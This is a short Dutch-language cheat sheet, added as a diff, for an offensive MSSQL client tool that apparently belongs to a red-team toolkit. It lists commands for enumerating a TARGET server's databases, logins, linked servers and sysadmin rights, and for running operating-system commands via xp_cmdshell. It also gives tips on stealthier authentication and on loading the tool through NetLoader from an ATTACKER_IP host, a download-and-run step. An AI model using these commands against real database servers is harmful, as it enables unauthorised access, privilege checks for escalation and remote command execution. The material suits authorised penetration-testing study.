@@ -1,0 +1,40 @@
+# MSSQL — MSSQL client tool (gebaseerd op SqlClient)
+# Simpele .NET MSSQL client voor directe SQL interactie en command execution
+#
+# === Syntax ===
+# MSSQL.exe -instance <server> [-username USER] [-password PASS] [-command SQL]
+#
+# === Belangrijkste opties ===
+# -instance SERVER     MSSQL server (IP of hostname, optioneel ,poort)
+# -username USER       SQL login gebruikersnaam (leeg = Windows authenticatie)
+# -password PASS       SQL login wachtwoord
+# -command SQL         SQL query om uit te voeren
+#
+# === Voorbeelden ===
+# -- Windows authenticatie (huidige user) --
+# Verbind en voer query uit:
+MSSQL.exe -instance TARGET -command "SELECT @@version"
+# Huidige gebruiker:
+MSSQL.exe -instance TARGET -command "SELECT SYSTEM_USER"
+# Sysadmin check:
+MSSQL.exe -instance TARGET -command "SELECT IS_SRVROLEMEMBER('sysadmin')"
+#
+# -- SQL authenticatie --
+MSSQL.exe -instance TARGET -username sa -password PASS -command "SELECT @@version"
+# Met poort:
+MSSQL.exe -instance TARGET,1433 -username sa -password PASS -command "SELECT name FROM master.sys.databases"
+#
+# -- Enumeratie --
+# Databases:
+MSSQL.exe -instance TARGET -command "SELECT name FROM master.sys.databases"
+# Logins:
+MSSQL.exe -instance TARGET -command "SELECT name FROM sys.server_principals"
+# Linked servers:
+MSSQL.exe -instance TARGET -command "EXEC sp_linkedservers"
+#
+# -- Command execution --
+MSSQL.exe -instance TARGET -command "EXEC master..xp_cmdshell 'whoami'"
+#
+# Tip: Gebruik Windows auth waar mogelijk (stealthier dan SQL auth)
+# Tip: Laad via NetLoader: Loader.exe -path http://ATTACKER_IP/tools/MSSQL.exe -args "..."
+# Tip: Zie ook: man_sharpsql, man_powerupsql, mssql_xpcmdshell
